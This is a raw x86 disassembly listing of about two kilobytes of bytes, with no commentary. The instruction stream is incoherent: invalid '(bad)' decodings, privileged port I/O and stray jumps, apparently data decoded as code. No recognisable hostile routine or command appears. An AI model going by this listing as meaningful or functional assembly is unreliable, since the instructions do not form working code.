  413cda:	xor    eax,0x567fd620
  413cdf:	out    dx,al
  413ce0:	add    DWORD PTR [edi],ebx
  413ce2:	in     eax,0x63
  413ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ce5:	cmp    bh,BYTE PTR [ebx+esi*8-0x5367d83e]
  413cec:	in     al,0x3
  413cee:	jo     0x413d48
  413cf0:	sub    al,0x4d
  413cf2:	(bad)  
  413cf4:	sub    eax,0x1f5a81a8
  413cf9:	cs scas al,BYTE PTR es:[edi]
  413cfb:	xchg   esi,eax
  413cfc:	mov    WORD PTR [ebp-0x3bd168d5],ds
  413d02:	mov    eax,ds:0xb3ebe20b
  413d07:	das    
  413d08:	push   cs
  413d09:	cdq    
  413d0a:	into   
  413d0b:	or     eax,0x62c46b04
  413d10:	data16 aaa 
  413d12:	in     al,dx
  413d13:	cmp    dl,BYTE PTR [edi+ebp*4+0x62487a7b]
  413d1a:	cmp    DWORD PTR [esi-0x7efae37c],ebp
  413d20:	xor    BYTE PTR [eax-0x59],dh
  413d23:	(bad)  
  413d25:	enter  0x845f,0x25
  413d29:	cmp    al,0x6d
  413d2c:	adc    DWORD PTR [ecx-0x4730ff21],ebx
  413d32:	xchg   edx,eax
  413d33:	js     0x413cbb
  413d35:	lahf   
  413d36:	mov    cl,0xdb
  413d38:	mov    al,ds:0xe275b958
  413d3d:	mov    al,ds:0xaadbf257
  413d42:	mov    ecx,0x52c260c5
  413d47:	js     0x413d56
  413d49:	imul   edx,DWORD PTR [edx-0x364a2254],0xffffffbc
  413d50:	jp     0x413d47
  413d52:	cli    
  413d53:	dec    eax
  413d54:	rcl    BYTE PTR es:[ebx],0x40
  413d58:	pop    ss
  413d59:	or     al,0x67
  413d5b:	neg    edx
  413d5d:	xchg   esp,eax
  413d5e:	push   cs
  413d5f:	lods   eax,DWORD PTR ds:[esi]
  413d60:	lods   al,BYTE PTR ds:[esi]
  413d61:	pop    ebx
  413d62:	sti    
  413d63:	mul    DWORD PTR [ecx]
  413d65:	jle    0x413d4f
  413d67:	cdq    
  413d68:	sub    ecx,DWORD PTR [ebp+0x5e]
  413d6b:	cs ret 0x58e3
  413d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d70:	fs mov ecx,0xacb5f0b7
  413d76:	xchg   edx,eax
  413d77:	xor    DWORD PTR [ebx-0x45f92ed9],esp
  413d7d:	test   eax,0x1568ed9a
  413d82:	dec    ecx
  413d83:	test   BYTE PTR [edi-0x32],bh
  413d86:	mov    ds:0xe509b9de,eax
  413d8b:	(bad)  
  413d8c:	pop    ebx
  413d8d:	push   DWORD PTR [ebp-0x97e483b]
  413d93:	jo     0x413d85
  413d95:	mov    esp,0xf0cac9b8
  413d9a:	loopne 0x413d94
  413d9c:	jb     0x413d53
  413d9e:	and    esp,DWORD PTR [edi+esi*8]
  413da1:	dec    esp
  413da2:	add    al,0x26
  413da4:	mov    gs,WORD PTR [ebx]
  413da6:	(bad)  
  413da7:	sar    cl,cl
  413da9:	adc    BYTE PTR [edi+0x61],ah
  413dac:	mov    DWORD PTR [eax],edx
  413dae:	or     al,0xcf
  413db0:	call   0xf1b18c8d
  413db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413db6:	jg     0x413d98
  413db8:	ret    
  413db9:	xor    edi,DWORD PTR [eax-0x35c79343]
  413dbf:	jp     0x413d42
  413dc1:	sub    bh,BYTE PTR [edx+0x10]
  413dc4:	sti    
  413dc5:	mov    eax,0xaae97324
  413dca:	xchg   ebx,eax
  413dcb:	ror    esp,0x6d
  413dce:	mov    esp,0xca829d9f
  413dd3:	push   esi
  413dd4:	mov    esp,0x49a9a532
  413dd9:	inc    ebx
  413dda:	sbb    ebx,DWORD PTR [edi]
  413ddc:	dec    ebx
  413ddd:	sbb    BYTE PTR [edx+0x2bcdbfe8],dl
  413de3:	or     eax,0x789b55e3
  413de8:	out    0x3b,eax
  413dea:	xchg   esi,eax
  413deb:	jno    0x413e00
  413ded:	dec    edx
  413dee:	fwait
  413def:	loopne 0x413e3b
  413df1:	test   DWORD PTR [ebx-0x15d1e0d8],0xe0005939
  413dfb:	fwait
  413dfc:	push   ds
  413dfd:	adc    cl,BYTE PTR [edi+0x7a]
  413e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e01:	mul    esi
  413e03:	lahf   
  413e04:	xor    DWORD PTR [esp+eax*4-0x4832c7fc],ecx
  413e0b:	sbb    BYTE PTR [esi-0x68],al
  413e0e:	inc    ebx
  413e0f:	sar    DWORD PTR [esi+0x5c],0xe2
  413e13:	mov    ebx,0xd828d7c8
  413e18:	adc    esp,DWORD PTR [esi]
  413e1a:	sbb    bh,cl
  413e1c:	cmp    al,0x29
  413e1e:	mov    cl,cl
  413e20:	push   edx
  413e21:	arpl   WORD PTR [ecx],dx
  413e23:	into   
  413e24:	mov    cl,0x30
  413e26:	stos   BYTE PTR es:[edi],al
  413e27:	inc    ecx
  413e28:	enter  0xeb2a,0xc9
  413e2c:	retf   
  413e2d:	test   DWORD PTR [esi+0x41],esp
  413e30:	mov    bh,0xf5
  413e32:	sub    ch,al
  413e34:	inc    esi
  413e35:	aam    0xd7
  413e37:	int    0x41
  413e39:	add    bh,BYTE PTR [edi+0x6e763795]
  413e3f:	iret   
  413e40:	push   cs
  413e41:	pop    ebx
  413e42:	aas    
  413e43:	js     0x413e10
  413e45:	mov    ebp,esi
  413e47:	fs dec edx
  413e49:	cmp    BYTE PTR [edx],bh
  413e4b:	into   
  413e4c:	cmp    edx,ebp
  413e4e:	addr16 inc eax
  413e50:	xchg   ebp,ebx
  413e52:	push   esi
  413e53:	pop    edx
  413e54:	cs mov esp,0xbe6573e2
  413e5a:	leave  
  413e5b:	or     al,0x63
  413e5d:	dec    esi
  413e5e:	je     0x413ea5
  413e60:	cld    
  413e61:	cld    
  413e62:	inc    edi
  413e63:	xor    eax,0x539b4aa3
  413e68:	jmp    0x413e84
  413e6a:	jo     0x413ea9
  413e6c:	xor    edi,ebx
  413e6e:	popf   
  413e6f:	or     eax,0x9024bc97
  413e74:	lock inc ecx
  413e76:	fidivr DWORD PTR [ecx-0x182d536c]
  413e7c:	mov    eax,gs
  413e7e:	jl     0x413eda
  413e80:	pop    eax
  413e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e82:	dec    edx
  413e83:	jecxz  0x413efe
  413e85:	dec    ebp
  413e86:	dec    edi
  413e87:	bound  eax,QWORD PTR gs:[ebx+0x2b]
  413e8b:	mov    ah,0x1
  413e8d:	popf   
  413e8e:	imul   esi,DWORD PTR [ecx],0xfffffffa
  413e91:	in     al,dx
  413e92:	test   BYTE PTR [edi+0x60],dh
  413e95:	xor    BYTE PTR [ecx],al
  413e97:	jp     0x413e48
  413e99:	loope  0x413e5a
  413e9b:	inc    ecx
  413e9c:	xchg   ebp,eax
  413e9d:	aas    
  413e9e:	xchg   ebp,eax
  413e9f:	ret    
  413ea0:	lds    ebx,FWORD PTR [esi-0x63]
  413ea3:	std    
  413ea4:	repz loopne 0x413ed6
  413ea7:	inc    ecx
  413ea8:	pop    ebx
  413ea9:	addr16 (bad) 
  413eab:	je     0x413eb9
  413ead:	mov    esi,0x942d2ca0
  413eb2:	mov    eax,ds:0x191b3267
  413eb7:	je     0x413e5d
  413eb9:	push   0xa20d5062
  413ebe:	bound  eax,QWORD PTR es:[edi+0xa03cddc]
  413ec5:	add    DWORD PTR [ebx-0x3999642f],ebx
  413ecb:	xchg   edx,eax
  413ecc:	cli    
  413ecd:	push   edx
  413ece:	test   BYTE PTR [edx],bh
  413ed0:	dec    edi
  413ed1:	daa    
  413ed2:	xchg   ebp,eax
  413ed3:	jo     0x413ef1
  413ed5:	inc    esi
  413ed6:	bound  edi,QWORD PTR [ebp-0x15c47c5b]
  413edc:	fild   QWORD PTR ds:0x1e83980d
  413ee2:	push   ebp
  413ee3:	xor    DWORD PTR [ecx],0x5ada49b
  413ee9:	xchg   esi,eax
  413eea:	push   ecx
  413eeb:	int3   
  413eec:	std    
  413eed:	(bad)
  413ef0:	cmp    ch,BYTE PTR [eax]
  413ef2:	jl     0x413f5c
  413ef4:	add    bh,BYTE PTR [ebp+eax*4+0x47943704]
  413efb:	or     esp,edx
  413efd:	in     al,0x1d
  413eff:	pop    edx
  413f00:	fwait
  413f01:	sbb    ah,dl
  413f03:	call   0xa98da3b2
  413f08:	fist   DWORD PTR [ebp-0x61fbec1]
  413f0e:	(bad)  
  413f0f:	pop    edi
  413f10:	mov    dl,0x8c
  413f12:	inc    edi
  413f13:	lahf   
  413f14:	adc    al,0xf9
  413f16:	sub    DWORD PTR [eax+0x39ee1265],esp
  413f1c:	inc    ebp
  413f1d:	ja     0x413f7d
  413f1f:	dec    ebx
  413f20:	inc    edx
  413f21:	hlt    
  413f22:	sub    eax,DWORD PTR [eax-0x774c3730]
  413f28:	(bad)  
  413f29:	fist   DWORD PTR [edi+edx*1+0x74]
  413f2d:	or     eax,0xcbf1f084
  413f32:	jo     0x413eed
  413f34:	(bad)  
  413f36:	hlt    
  413f37:	pop    ebx
  413f38:	mov    ds:0x6318bbee,eax
  413f3d:	sub    cl,BYTE PTR [edi-0x45]
  413f40:	mov    bl,0xe3
  413f42:	mov    esp,0xcdfdf68d
  413f47:	ret    
  413f48:	dec    ecx
  413f49:	loop   0x413f17
  413f4b:	out    dx,al
  413f4c:	mov    cl,0xec
  413f4e:	adc    bh,BYTE PTR ds:0xfb0dbfd7
  413f54:	imul   edi,ebp,0xe
  413f57:	jnp    0x413fc1
  413f59:	js     0x413f38
  413f5b:	test   DWORD PTR [ebp-0x68],eax
  413f5e:	jge    0x413f98
  413f60:	jmp    0x7d905bb9
  413f65:	inc    ecx
  413f66:	inc    edx
  413f67:	aas    
  413f68:	xor    eax,ebp
  413f6a:	je     0x413f7a
  413f6c:	sbb    DWORD PTR [esi-0x23b8ab7f],0x9799600c
  413f76:	aas    
  413f77:	mov    ecx,0xa33816b
  413f7c:	jecxz  0x413f0d
  413f7e:	mov    WORD PTR [edi],ds
  413f80:	retf   
  413f81:	sub    ch,ah
  413f83:	mov    ebp,0x81b52bd2
  413f88:	mov    al,0x56
  413f8a:	pushf  
  413f8b:	push   ebx
  413f8c:	pop    edi
  413f8d:	aaa    
  413f8e:	pushf  
  413f8f:	ja     0x413fab
  413f91:	add    BYTE PTR [ebp-0x26],0x62
  413f95:	xchg   edi,eax
  413f96:	mov    esi,0xbcca91fd
  413f9b:	aam    0x11
  413f9d:	jnp    0x413f72
  413f9f:	hlt    
  413fa0:	and    BYTE PTR [eax-0x129b46e4],ah
  413fa6:	inc    esi
  413fa7:	(bad)  
  413fa8:	retf   
  413fa9:	mov    bh,bh
  413fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fac:	cmp    BYTE PTR [eax],0x8e
  413faf:	xchg   DWORD PTR ds:0xf9784167,ebx
  413fb5:	jb     0x413f68
  413fb7:	mov    eax,0xa1d37b0d
  413fbc:	sbb    ah,dl
  413fbe:	out    0xc9,eax
  413fc0:	cmp    DWORD PTR [ebx],ebx
  413fc2:	hlt    
  413fc3:	mov    ds,WORD PTR [esp+eax*8]
  413fc6:	cmp    BYTE PTR [edi],dh
  413fc8:	fild   WORD PTR ds:0x1f9c4c0c
  413fce:	mov    al,ds:0x3a1f7f97
  413fd3:	aas    
  413fd4:	xorps  xmm5,XMMWORD PTR [esi-0x1fce13db]
  413fdb:	ja     0x413fd5
  413fdd:	sub    BYTE PTR [edi+0xa],0xa
  413fe1:	xchg   ebx,eax
  413fe2:	push   esi
  413fe3:	mov    cl,0xd7
  413fe5:	or     eax,0xd9050abf
  413fea:	mov    dl,BYTE PTR [esi]
  413fec:	(bad)  
  413fed:	and    esp,ebx
  413fef:	ins    DWORD PTR es:[edi],dx
  413ff0:	daa    
  413ff1:	aaa    
  413ff2:	mov    ebx,0xe5ce041
  413ff7:	fs jg  0x413fd7
  413ffa:	push   es
  413ffb:	xchg   esp,eax
  413ffc:	leave  
  413ffd:	in     eax,dx
  413ffe:	inc    eax
  413fff:	(bad)  
  414000:	jns    0x414073
  414002:	das    
  414003:	pop    ds
  414004:	pop    ss
  414005:	inc    eax
  414006:	jge    0x414012
  414008:	test   eax,0xe9289e96
  41400d:	fiadd  DWORD PTR [ecx]
  41400f:	ja     0x414002
  414011:	inc    ecx
  414012:	je     0x413fcc
  414014:	xor    al,0x12
  414016:	mov    edx,0x7e5f5127
  41401b:	inc    ebx
  41401c:	in     al,0x81
  41401e:	pop    eax
  41401f:	jo     0x41402d
  414021:	popa   
  414022:	push   es
  414023:	sub    al,0x73
  414025:	mov    cl,0x7c
  414027:	pop    ds
  414028:	jmp    0x413fd3
  41402a:	push   cs
  41402b:	out    0x9,eax
  41402d:	pop    ebx
  41402e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41402f:	adc    al,BYTE PTR [eax+0x1b4bb208]
  414035:	inc    ebp
  414036:	pop    DWORD PTR [esi+edi*2-0x6afea677]
  41403d:	ins    BYTE PTR es:[edi],dx
  41403e:	outs   dx,DWORD PTR ds:[esi]
  41403f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414040:	lods   eax,DWORD PTR ds:[esi]
  414041:	mov    ds:0x64e4d36,eax
  414046:	(bad)  
  414047:	test   cl,0xdd
  41404a:	retf   0x9a55
  41404d:	ins    BYTE PTR es:[edi],dx
  41404e:	and    eax,ebp
  414050:	pop    es
  414051:	mov    dl,0x37
  414053:	ins    DWORD PTR es:[edi],dx
  414054:	inc    ebp
  414055:	adc    DWORD PTR [edi-0x7a227a2d],0x48
  41405c:	inc    ecx
  41405d:	pop    ecx
  41405e:	inc    edi
  41405f:	jnp    0x414010
  414061:	es mov ebp,0xb5906d0a
  414067:	and    bh,bl
  414069:	stc    
  41406a:	arpl   dx,bp
  41406c:	je     0x41409a
  41406e:	sahf   
  41406f:	push   0x7e821f96
  414074:	pop    ecx
  414075:	arpl   WORD PTR [edx],dx
  414077:	stc    
  414078:	pushf  
  414079:	leave  
  41407a:	push   es
  41407b:	les    esp,FWORD PTR [esi+0x63]
  41407e:	int    0x41
  414080:	xrelease xchg BYTE PTR [edx-0x21],bl
  414084:	fcomp  QWORD PTR [ebx]
  414086:	js     0x41402e
  414088:	cmp    DWORD PTR [edi+0x69992d4d],0xdc5688c6
  414092:	mov    ch,0x78
  414094:	lds    esi,FWORD PTR [edi+edx*2+0x5]
  414098:	leave  
  414099:	(bad)  [edi-0x65e65bf5]
  41409f:	pop    esi
  4140a0:	dec    edi
  4140a1:	nop
  4140a2:	ss cmp al,0x9b
  4140a5:	xchg   ecx,eax
  4140a6:	inc    edi
  4140a7:	sub    eax,0x80a8464b
  4140ac:	cmp    bl,BYTE PTR [edx+0xb2bf81b]
  4140b2:	lods   al,BYTE PTR ds:[esi]
  4140b3:	jns    0x414100
  4140b5:	scas   al,BYTE PTR es:[edi]
  4140b6:	jo     0x414054
  4140b8:	aaa    
  4140b9:	call   0x9605:0x86839ed9
  4140c0:	cmp    BYTE PTR [ecx-0x11a7cf04],bl
  4140c6:	mov    dl,0x96
  4140c8:	and    ch,BYTE PTR [eax]
  4140ca:	les    edx,FWORD PTR [eax+0x25]
  4140cd:	int    0x84
  4140cf:	(bad)  
  4140d0:	fsubr  QWORD PTR [edi-0x59]
  4140d3:	shl    DWORD PTR [esp+ebp*2+0x4a],0xf4
  4140d8:	dec    esp
  4140d9:	pop    ebx
  4140da:	ficom  WORD PTR [ebx]
  4140dc:	sub    esi,edx
  4140de:	out    dx,al
  4140df:	mov    WORD PTR [eax-0x7b],gs
  4140e2:	jmp    FWORD PTR [ecx]
  4140e4:	lea    ebp,[ebx-0x17c713ac]
  4140ea:	std    
  4140eb:	cmc    
  4140ec:	mov    bh,0xce
  4140ee:	sbb    al,0xf8
  4140f0:	pop    ebx
  4140f1:	rcl    al,0x4
  4140f4:	xchg   eax,eax
  4140f6:	inc    edi
  4140f7:	sub    eax,0x5fb201ad
  4140fc:	nop
  4140fd:	(bad)  
  4140fe:	and    al,0xa1
  414100:	aas    
  414101:	add    al,0xb4
  414103:	push   edx
  414104:	cli    
  414105:	pop    eax
  414106:	mov    bl,0xa2
  414108:	int3   
  414109:	in     al,0x2d
  41410b:	cmp    eax,0x5f100206
  414110:	in     eax,dx
  414111:	daa    
  414112:	repnz bound esi,QWORD PTR [edx+0x9]
  414116:	and    edi,ebp
  414118:	adc    DWORD PTR [esi-0x3],esi
  41411b:	mov    eax,ds:0x677c22aa
  414120:	ja     0x41416f
  414122:	xlat   BYTE PTR ds:[ebx]
  414123:	out    0xb,eax
  414125:	dec    edx
  414126:	xor    esi,ebx
  414128:	sbb    eax,0xe99ab700
  41412d:	sub    al,0xce
  41412f:	xchg   BYTE PTR [esi+0x3708854e],ah
  414135:	cwde   
  414136:	sahf   
  414137:	sub    DWORD PTR [edx-0x6971d008],ebp
  41413d:	loope  0x4140ec
  41413f:	mov    esp,0x4d311252
  414144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414145:	adc    ch,BYTE PTR [edx-0x628769b7]
  41414b:	ret    0x3855
  41414e:	inc    esi
  41414f:	sub    ecx,edx
  414151:	ss push esp
  414153:	sahf   
  414154:	and    dh,BYTE PTR [eax+0x25]
  414157:	ror    DWORD PTR [ebx],1
  414159:	mov    ebp,0xcdcbe68d
  41415e:	mov    edx,0xd83b8036
  414163:	clc    
  414164:	jne    0x4140eb
  414166:	sub    eax,0xc08d3fda
  41416b:	ret    0x81f9
  41416e:	push   esi
  41416f:	cs sub cl,cl
  414172:	inc    ecx
  414173:	pop    ss
  414174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414175:	inc    edi
  414176:	lds    edi,FWORD PTR [ebx]
  414178:	in     eax,0x4f
  41417a:	adc    al,0xa
  41417c:	mov    eax,0x313ed95f
  414181:	mov    dh,0x38
  414183:	loop   0x414170
  414185:	mov    WORD PTR [edx-0x29aa42d0],es
  41418b:	cmp    bh,ah
  41418d:	sbb    BYTE PTR [edi+0x18],al
  414190:	mov    esp,0xe21b980b
  414195:	mov    al,ds:0x65544a7
  41419a:	jbe    0x414195
  41419c:	loopne 0x4141b4
  41419e:	xlat   BYTE PTR ds:[ebx]
  41419f:	push   0x573108ba
  4141a4:	jp     0x4141c1
  4141a6:	mov    ah,bl
  4141a8:	fld    DWORD PTR [esp+ebx*1]
  4141ab:	imul   esp,DWORD PTR [edx-0x7164a7ba],0x79
  4141b2:	in     eax,dx
  4141b3:	and    ebx,DWORD PTR [ebx+0xc6698cf]
  4141b9:	dec    edx
  4141ba:	dec    esp
  4141bb:	lea    eax,ds:0xbf6dc724
  4141c1:	xlat   BYTE PTR ds:[ebx]
  4141c2:	(bad)  
  4141c3:	out    0x2f,al
  4141c5:	inc    ebp
  4141c6:	loop   0x414175
  4141c8:	sub    al,0x11
  4141ca:	fmul   DWORD PTR [edx]
  4141cc:	cli    
  4141cd:	retf   0x4c44
  4141d0:	xor    al,0xe
  4141d2:	push   cs
  4141d3:	sub    eax,0xd5e31b25
  4141d8:	push   ebp
  4141d9:	scas   eax,DWORD PTR es:[edi]
  4141da:	or     al,0x2f
  4141dc:	dec    ebp
  4141dd:	cmp    eax,0x47fa4355
  4141e2:	stos   DWORD PTR es:[edi],eax
  4141e3:	enter  0x36bc,0x23
  4141e7:	jp     0x414257
  4141e9:	xor    BYTE PTR [edi-0x6f7ec80d],cl
  4141ef:	pop    edi
  4141f0:	hlt    
  4141f1:	xor    al,BYTE PTR [ebp+edi*4+0x36]
  4141f5:	ffree  st(1)
  4141f7:	into   
  4141f8:	mov    bl,0x67
  4141fa:	loope  0x414203
  4141fc:	jne    0x414236
  4141fe:	jo     0x354ce5f4
  414204:	sub    ecx,DWORD PTR [eax+0x38]
  414207:	inc    esp
  414208:	pop    ecx
  414209:	pop    edx
  41420a:	in     al,0xce
  41420c:	outs   dx,BYTE PTR ds:[esi]
  41420d:	into   
  41420e:	mov    edi,0x68bded15
  414213:	loopne 0x4141b8
  414215:	mov    eax,0x2382ac9d
  41421a:	adc    bl,BYTE PTR [esi+edx*8+0x31]
  41421e:	mov    WORD PTR [ecx],gs
  414220:	sub    al,0x27
  414222:	mov    ch,0xc1
  414224:	cmp    ch,ch
  414226:	ja     0x4141f6
  414228:	adc    DWORD PTR [esi-0x38],esi
  41422b:	retf   0x4f6a
  41422e:	imul   ecx,DWORD PTR [eax+0x45],0xb1365f0a
  414235:	sbb    bl,BYTE PTR gs:[ebp+ecx*1+0x7592d435]
  41423d:	sbb    al,0xdd
  41423f:	push   0x13
  414241:	xor    eax,DWORD PTR [edi+0x15]
  414244:	pusha  
  414245:	cdq    
  414246:	push   ds
  414247:	xchg   edi,eax
  414248:	mov    esi,0x3a934bdb
  41424d:	mov    cs,WORD PTR [ebp-0x3b]
  414250:	mov    eax,0x7fc15269
  414255:	mov    bl,0x32
  414257:	sbb    bh,BYTE PTR [esi+0x61]
  41425a:	sbb    ch,BYTE PTR [edi]
  41425c:	int3   
  41425d:	lea    ecx,[ebp+esi*2-0x53]
  414261:	ins    DWORD PTR es:[edi],dx
  414262:	pop    ebx
  414263:	fistp  DWORD PTR [edx+0x61]
  414266:	push   edx
  414267:	(bad)  
  414268:	cmp    eax,0xa5164a47
  41426d:	xor    DWORD PTR [ecx+0x22863ac3],ebx
  414273:	mov    ?,ebx
  414275:	fmul   DWORD PTR [ebx+eax*1-0x61]
  414279:	dec    ebp
  41427a:	xor    al,BYTE PTR [edx]
  41427c:	pop    edi
  41427d:	(bad)  
  41427f:	push   eax
  414280:	dec    esp
  414281:	(bad)  
  414282:	jl     0x414248
  414284:	add    DWORD PTR [edx],ebp
  414286:	mov    cl,0x1e
  414288:	shr    BYTE PTR [ebp+ebx*1-0x76],1
  41428c:	ins    DWORD PTR es:[edi],dx
  41428d:	and    ah,BYTE PTR [ebp-0x3d]
  414290:	or     al,0x5
  414292:	test   al,0x6f
  414294:	in     al,0x19
  414296:	adc    BYTE PTR [esp+ecx*4+0x14],0x8f
  41429b:	nop
  41429c:	lds    ebx,FWORD PTR [edx+0x48]
  41429f:	or     al,0x15
  4142a1:	shl    DWORD PTR [edi+0x2b],1
  4142a4:	out    0x1c,al
  4142a6:	pop    esp
  4142a7:	or     DWORD PTR [edx],ebx
  4142a9:	aam    0x4c
  4142ab:	mov    dl,0x1e
  4142ad:	je     0x414265
  4142af:	jp     0x4142c9
  4142b1:	stc    
  4142b2:	ficomp WORD PTR [ebx]
  4142b4:	pop    esp
  4142b5:	pop    esp
  4142b6:	scas   eax,DWORD PTR es:[edi]
  4142b7:	stos   DWORD PTR es:[edi],eax
  4142b8:	jp     0x4142b2
  4142ba:	lods   eax,DWORD PTR ds:[esi]
  4142bb:	jbe    0x414292
  4142bd:	pop    esi
  4142be:	dec    ebp
  4142bf:	push   esi
  4142c0:	adc    eax,0xaa5dbb49
  4142c5:	xor    dh,BYTE PTR [ebx+ebp*1]
  4142c8:	jno    0x4142a6
  4142ca:	retf   
  4142cb:	imul   bh
  4142cd:	push   ecx
  4142ce:	iret   
  4142cf:	sub    DWORD PTR [ecx],0x5bfe4f02
  4142d5:	call   0x82c6ab7e
  4142da:	cdq    
  4142db:	dec    ecx
  4142dc:	pop    sp
  4142de:	in     eax,0x5f
  4142e0:	jne    0x4142d6
  4142e2:	out    0xd6,eax
  4142e4:	xor    al,0x7a
  4142e6:	iret   
  4142e7:	xchg   ebp,eax
  4142e8:	ds clc 
  4142ea:	iret   
  4142eb:	pop    ecx
  4142ec:	call   0x978e7765
  4142f1:	inc    esp
  4142f2:	fild   DWORD PTR [ebx-0x1f]
  4142f5:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4142f7:	lds    edi,FWORD PTR [eax]
  4142f9:	retf   0x330e
  4142fc:	jae    0x41427e
  4142fe:	scas   al,BYTE PTR es:[edi]
  4142ff:	aas    
  414300:	push   esp
  414301:	ficom  WORD PTR [ebp-0x17]
  414304:	pop    ebp
  414305:	cmp    eax,0xb9f8866f
  41430a:	sub    eax,0x222e2f56
  41430f:	div    DWORD PTR [ecx-0x2d]
  414312:	je     0x414297
  414314:	je     0x41437d
  414316:	(bad)
  414319:	mov    ds:0x274392bc,eax
  41431e:	jmp    DWORD PTR [eax+0x3f]
  414321:	cs pop ss
  414323:	imul   esi,DWORD PTR [edx-0x2f],0x22
  414327:	out    dx,eax
  414328:	pop    ds
  414329:	ror    BYTE PTR [eax+edx*2+0x6235b92a],1
  414330:	xchg   edi,eax
  414331:	jl     0x41434b
  414333:	sahf   
  414334:	mov    ecx,0xa68d6966
  414339:	fwait
  41433a:	and    dh,BYTE PTR [edx+0x68]
  41433d:	or     DWORD PTR [edi-0x2b],edi
  414340:	fimul  WORD PTR [edi-0x62f4be8a]
  414346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414347:	leave  
  414348:	iret   
  414349:	mov    ecx,0x6d1acded
  41434e:	sub    dh,BYTE PTR [edi-0x5d9edd5]
  414354:	cwde   
  414355:	cs add ebp,ecx
  414358:	and    ebx,DWORD PTR [ecx]
  41435a:	sbb    eax,DWORD PTR [edi+0x6708105]
  414360:	and    ecx,DWORD PTR [esi-0x640f8739]
  414366:	pop    ebx
  414367:	pop    ebp
  414368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414369:	push   ds
  41436a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41436b:	mov    edx,0x695e294e
  414370:	shl    ah,0xab
  414373:	sbb    cl,BYTE PTR [eax]
  414375:	bound  eax,QWORD PTR [eax+0x40]
  414378:	test   DWORD PTR [ecx+esi*4],esi
  41437b:	test   ebx,0x32e8f00c
  414381:	retf   
  414382:	mov    cl,0x25
  414384:	add    al,0x9e
  414386:	push   0x4fd6a32e
  41438b:	sub    eax,0x5fdbdd6f
  414390:	aas    
  414391:	mov    edi,0xd6d73ff8
  414396:	sbb    DWORD PTR [eax+0x36fec69],0x1b
  41439d:	sbb    BYTE PTR [esi],bh
  41439f:	cmp    BYTE PTR [esi],ah
  4143a1:	rcl    BYTE PTR [edx],1
  4143a3:	add    DWORD PTR ds:0x9b225851,0x1b
  4143aa:	dec    edi
  4143ab:	lahf   
  4143ac:	scas   al,BYTE PTR es:[edi]
  4143ad:	stos   BYTE PTR es:[edi],al
  4143ae:	xor    dh,BYTE PTR ss:[eax-0x2b]
  4143b2:	aaa    
  4143b3:	jns    0x414403
  4143b5:	mov    ebp,?
  4143b7:	icebp  
  4143b8:	fstp   st(4)
  4143ba:	daa    
  4143bb:	inc    eax
  4143bc:	out    dx,al
  4143bd:	or     esp,eax
  4143bf:	push   esi
  4143c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c1:	push   es
  4143c2:	popf   
  4143c3:	mov    ds:0x3839d9ab,al
  4143c8:	adc    bl,BYTE PTR [esi+ecx*2]
  4143cb:	call   0xef08c793
  4143d0:	inc    ecx
  4143d1:	mov    dl,0x9e
  4143d3:	pop    eax
  4143d4:	clc    
  4143d5:	and    eax,0xd31c0ec1
  4143da:	mov    dl,0x6a
  4143dc:	sub    DWORD PTR [esi-0x5d4fef18],ebx
  4143e2:	jle    0x414434
  4143e4:	mov    al,0xfc
  4143e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143e7:	add    BYTE PTR [eax],0x19
  4143ea:	sbb    DWORD PTR [ebp-0x42],edi
  4143ed:	add    edi,ecx
  4143ef:	(bad)  
  4143f0:	cmp    BYTE PTR [ecx],0x76
  4143f3:	mov    al,ds:0x7c88b7ff
  4143f8:	fst    DWORD PTR [esi+eiz*1]
  4143fb:	mov    bh,0xe4
  4143fd:	mov    esi,0xd8f5568d
  414402:	aas    
  414403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414404:	mov    esi,0x49974cf0
  414409:	mov    al,0xc5
  41440b:	pushf  
  41440c:	cli    
  41440d:	sub    al,0x1
  41440f:	jo     0x41448a
  414411:	xchg   ecx,eax
  414412:	and    bl,BYTE PTR [ecx-0x59]
  414415:	ret    
  414416:	and    DWORD PTR [ecx+edx*8],ebp
  414419:	es test eax,0x7f126c7a
  41441f:	jns    0x414416
  414421:	popf   
  414422:	xor    esi,DWORD PTR [ecx]
  414424:	mov    ah,0x89
  414426:	addr16 (bad) 
  414428:	and    BYTE PTR [ebp+0xb],al
  41442b:	(bad)  
  41442d:	gs cdq 
  41442f:	jnp    0x4143e3
  414431:	dec    eax
  414432:	xor    ebp,ebp
  414434:	jbe    0x414456
  414436:	mov    ecx,0x3990f47
  41443b:	sbb    ecx,DWORD PTR [esi-0x617e02f6]
  414441:	ins    DWORD PTR es:[edi],dx
  414442:	dec    esi
  414443:	inc    esi
  414444:	ffreep st(6)
  414446:	in     al,0x38
  414448:	test   eax,0xd3692234
  41444d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41444e:	dec    edi
  41444f:	sahf   
  414450:	sti    
  414451:	das    
  414452:	sub    BYTE PTR [edi],bl
  414454:	repz mov ebx,0x5a6d0d93
  41445a:	xchg   edi,eax
  41445b:	jl     0x414436
  41445d:	mov    ecx,ebp
  41445f:	sbb    al,0xa
  414461:	(bad)  
  414463:	xchg   edi,eax
  414464:	mov    al,ds:0x459adfb7
  414469:	ss push cs
  41446b:	ret    
  41446c:	adc    edx,ecx
  41446e:	fmul   QWORD PTR [edx+0x3c7dd4bb]
  414474:	pop    edx
  414475:	je     0x414445
  414477:	xchg   ecx,edx
  414479:	es pop eax
  41447b:	je     0x414447
  41447d:	pop    ebp
  41447e:	pop    ds
  41447f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
